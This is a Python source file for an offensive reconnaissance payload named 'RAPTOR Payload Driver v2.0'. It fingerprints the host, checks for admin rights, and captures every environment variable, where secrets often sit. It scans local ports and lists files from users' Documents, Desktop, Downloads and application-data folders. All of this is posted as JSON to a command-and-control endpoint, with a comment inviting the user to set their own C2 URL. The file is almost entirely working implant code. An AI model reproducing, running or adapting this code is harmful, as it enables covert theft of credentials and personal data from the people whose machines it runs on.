"""
Enhanced RAPTOR Payload Driver v2.0
Includes file enumeration capabilities for comprehensive reconnaissance
"""
import platform
import os
import getpass
import socket
import psutil
import ctypes
import json
import requests
import logging
from pathlib import Path
from datetime import datetime

logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler()]
)

log_path = "logs_v2.json"


def enumerate_files(directories, max_files=500, max_depth=3):
    """
    Enumerate files from specified directories with depth limits
    
    Args:
        directories: List of directory paths to scan
        max_files: Maximum number of files to enumerate (prevent overwhelming C2)
        max_depth: Maximum directory depth to traverse
    
    Returns:
        List of file metadata dictionaries
    """
    logging.info(f"📁 Starting file enumeration (max {max_files} files, depth {max_depth})")
    
    files_found = []
    file_count = 0
    
    for base_dir in directories:
        if file_count >= max_files:
            logging.warning(f"Reached max file limit ({max_files}), stopping enumeration")
            break
            
        try:
            base_path = Path(base_dir)
            if not base_path.exists():
                logging.warning(f"Directory does not exist: {base_dir}")
                continue
                
            logging.debug(f"Scanning directory: {base_dir}")
            
            # Walk directory tree with depth limit
            for root, dirs, files in os.walk(base_path):
                # Calculate current depth
                current_depth = str(root).count(os.sep) - str(base_path).count(os.sep)
                
                if current_depth >= max_depth:
                    # Clear dirs to prevent deeper traversal
                    dirs.clear()
                    continue
                
                for filename in files:
                    if file_count >= max_files:
                        break
                        
                    try:
                        file_path = os.path.join(root, filename)
                        
                        # Get file stats
                        stats = os.stat(file_path)
                        
                        # Extract file extension
                        _, extension = os.path.splitext(filename)
                        
                        file_metadata = {
                            "name": filename,
                            "path": file_path,
                            "extension": extension.lower() if extension else "",
                            "size": stats.st_size,
                            "modified_time": datetime.fromtimestamp(stats.st_mtime).isoformat(),
                            "created_time": datetime.fromtimestamp(stats.st_ctime).isoformat(),
                            "is_hidden": filename.startswith('.') or (stats.st_file_attributes & 2 if hasattr(stats, 'st_file_attributes') else False),
                        }
                        
                        files_found.append(file_metadata)
                        file_count += 1
                        
                        if file_count % 100 == 0:
                            logging.debug(f"Enumerated {file_count} files so far...")
                            
                    except (PermissionError, OSError) as e:
                        logging.debug(f"Cannot access file {filename}: {e}")
                        continue
                        
        except (PermissionError, OSError) as e:
            logging.warning(f"Cannot access directory {base_dir}: {e}")
            continue
    
    logging.info(f"✓ File enumeration complete: {len(files_found)} files found")
    return files_found


def get_target_directories():
    """
    Determine directories to enumerate based on OS
    
    Returns:
        List of directory paths to scan
    """
    os_name = platform.system()
    directories = []
    
    if os_name == "Windows":
        # Windows directories
        user_profile = os.environ.get('USERPROFILE', '')
        appdata = os.environ.get('APPDATA', '')
        
        directories = [
            os.path.join(user_profile, "Documents"),
            os.path.join(user_profile, "Desktop"),
            os.path.join(user_profile, "Downloads"),
            os.path.join(appdata, "Microsoft"),
            os.path.join(user_profile, "AppData", "Local"),
        ]
        
    elif os_name == "Linux":
        # Linux directories
        home = os.path.expanduser("~")
        directories = [
            os.path.join(home, "Documents"),
            os.path.join(home, "Desktop"),
            os.path.join(home, "Downloads"),
            os.path.join(home, ".config"),
            os.path.join(home, ".local"),
        ]
        
    elif os_name == "Darwin":  # macOS
        home = os.path.expanduser("~")
        directories = [
            os.path.join(home, "Documents"),
            os.path.join(home, "Desktop"),
            os.path.join(home, "Downloads"),
            os.path.join(home, "Library"),
        ]
    
    # Filter to only existing directories
    existing_dirs = [d for d in directories if os.path.exists(d)]
    logging.debug(f"Target directories: {existing_dirs}")
    
    return existing_dirs


def gather_system_info():
    """
    Gather comprehensive system information
    
    Returns:
        Dictionary containing system reconnaissance data
    """
    logging.debug("Starting system information gathering...")
    
    os_name = platform.system()
    os_version = platform.version()
    architecture = platform.architecture()[0]
    current_user = getpass.getuser()
    hostname = platform.node()
    os_release = platform.release()
    uname = platform.uname()
    machine = platform.machine()
    processor = platform.processor()
    python_version = platform.python_version()
    environment_variables = os.environ

    if os_name == "Windows":
        windows_version = platform.win32_ver()
    else:
        windows_version = None

    # Check admin/root privileges
    is_admin = False
    if os_name == "Windows":
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception as e:
            logging.warning(f"Error checking admin rights: {e}")
            is_admin = False
    else:
        is_admin = os.geteuid() == 0 if hasattr(os, 'geteuid') else False

    recon_data = {
        "os_name": os_name,
        "os_version": os_version,
        "os_release": os_release,
        "architecture": architecture,
        "hostname": hostname,
        "current_user": current_user,
        "machine": machine,
        "processor": processor,
        "python_version": python_version,
        "windows_version": windows_version,
        "is_admin": is_admin,
        "env_vars": dict(environment_variables),
    }
    
    logging.info("✓ System information gathered")
    return recon_data


def scan_ports(target="127.0.0.1", start_port=1, end_port=1025):
    """
    Scan for open ports on target
    
    Args:
        target: IP address to scan (default: localhost)
        start_port: Starting port number
        end_port: Ending port number
    
    Returns:
        List of open port numbers
    """
    logging.info(f"🔍 Scanning ports {start_port}-{end_port} on {target}...")
    open_ports = []

    for port in range(start_port, end_port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.3)
        try:
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
                logging.debug(f"Port {port}: OPEN")
        except Exception as e:
            logging.debug(f"Error scanning port {port}: {e}")
        finally:
            sock.close()

    logging.info(f"✓ Port scan complete: {len(open_ports)} open ports found")
    return open_ports


def send_to_c2(payload, c2_url):
    """
    Send reconnaissance data to C2 server
    
    Args:
        payload: Dictionary containing recon data
        c2_url: C2 server endpoint URL
    
    Returns:
        Response from C2 server or None on failure
    """
    logging.info(f"📡 Sending data to C2 server: {c2_url}")
    
    try:
        response = requests.post(c2_url, json=payload, timeout=15)
        logging.debug(f"HTTP Status: {response.status_code}")
        
        if response.status_code == 200:
            logging.info("✓ Data successfully sent to C2")
            try:
                response_data = response.json()
                logging.info(f"C2 Response: {response_data}")
                return response_data
            except json.JSONDecodeError:
                logging.warning("C2 response is not JSON")
                return {"status": "success", "raw_response": response.text}
        else:
            logging.error(f"✗ Failed to send data: HTTP {response.status_code}")
            logging.error(f"Response: {response.text}")
            return None
            
    except requests.exceptions.ConnectionError as e:
        logging.error(f"✗ Connection error: {e}")
        return None
    except requests.exceptions.Timeout as e:
        logging.error(f"✗ Request timeout: {e}")
        return None
    except requests.exceptions.RequestException as e:
        logging.error(f"✗ Error sending data to C2: {e}")
        return None


def save_local_copy(payload, log_path):
    """
    Save payload to local JSON file
    
    Args:
        payload: Dictionary to save
        log_path: Path to save file
    """
    logging.debug(f"💾 Saving local copy to {log_path}...")
    try:
        with open(log_path, "w") as f:
            json.dump(payload, f, indent=4)
        logging.info(f"✓ Payload saved to {log_path}")
    except Exception as e:
        logging.error(f"✗ Error saving payload: {e}")


def main():
    """
    Main execution function for enhanced payload
    """
    logging.info("=" * 70)
    logging.info("🚀 RAPTOR Enhanced Payload v2.0 - Starting Reconnaissance")
    logging.info("=" * 70)
    
    # Step 1: Gather system information
    logging.info("\n[1/4] Gathering system information...")
    recon_data = gather_system_info()
    
    # Log system info
    logging.info("=== System Fingerprint ===")
    logging.info(f"OS Name       : {recon_data['os_name']}")
    logging.info(f"OS Version    : {recon_data['os_version']}")
    logging.info(f"Architecture  : {recon_data['architecture']}")
    logging.info(f"Hostname      : {recon_data['hostname']}")
    logging.info(f"Current User  : {recon_data['current_user']}")
    logging.info(f"Is Admin/Root : {recon_data['is_admin']}")
    
    # Step 2: Scan ports
    logging.info("\n[2/4] Scanning network ports...")
    open_ports = scan_ports(target="127.0.0.1", start_port=1, end_port=1025)
    recon_data['open_ports'] = open_ports
    logging.info(f"Open ports: {open_ports[:10]}{'...' if len(open_ports) > 10 else ''}")
    
    # Step 3: Enumerate files
    logging.info("\n[3/4] Enumerating files...")
    target_dirs = get_target_directories()
    files = enumerate_files(target_dirs, max_files=500, max_depth=3)
    
    # Add file summary to recon data
    recon_data['files'] = files
    recon_data['file_summary'] = {
        "total_files": len(files),
        "by_extension": {}
    }
    
    # Count files by extension
    for file in files:
        ext = file['extension'] or 'no_extension'
        recon_data['file_summary']['by_extension'][ext] = \
            recon_data['file_summary']['by_extension'].get(ext, 0) + 1
    
    logging.info(f"Files found: {len(files)}")
    logging.info(f"File types: {list(recon_data['file_summary']['by_extension'].keys())[:10]}")
    
    # Build final payload
    payload = {
        "recon_data": recon_data
    }
    
    # Step 4: Send to C2
    logging.info("\n[4/4] Contacting C2 server...")
    
    # Change this to your C2 server URL
    c2_url = "http://127.0.0.1:8000/api/submit_scan/"
    
    c2_response = send_to_c2(payload, c2_url)
    
    if c2_response and 'session_id' in c2_response:
        logging.info(f"✓ Session created: {c2_response['session_id']}")
        logging.info(f"✓ Status: {c2_response.get('status', 'unknown')}")
        logging.info(f"✓ Message: {c2_response.get('message', 'No message')}")
        
        # Save session ID for later reference
        payload['session_id'] = c2_response['session_id']
    
    # Save local copy
    save_local_copy(payload, log_path)
    
    logging.info("\n" + "=" * 70)
    logging.info("✅ Reconnaissance complete!")
    logging.info("=" * 70)
    
    # Print summary
    logging.info("\n📊 Summary:")
    logging.info(f"   • System: {recon_data['os_name']} {recon_data['os_release']}")
    logging.info(f"   • User: {recon_data['current_user']} ({'Admin' if recon_data['is_admin'] else 'User'})")
    logging.info(f"   • Open Ports: {len(open_ports)}")
    logging.info(f"   • Files Enumerated: {len(files)}")
    logging.info(f"   • Payload Size: {len(json.dumps(payload))} bytes")
    
    if c2_response and 'session_id' in c2_response:
        logging.info(f"   • Session ID: {c2_response['session_id']}")
        logging.info(f"\n🔍 Track your session at: {c2_url.replace('/submit_scan/', '')}/session/{c2_response['session_id']}/")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logging.warning("\n⚠️  Execution interrupted by user")
    except Exception as e:
        logging.error(f"\n❌ Fatal error: {e}", exc_info=True)
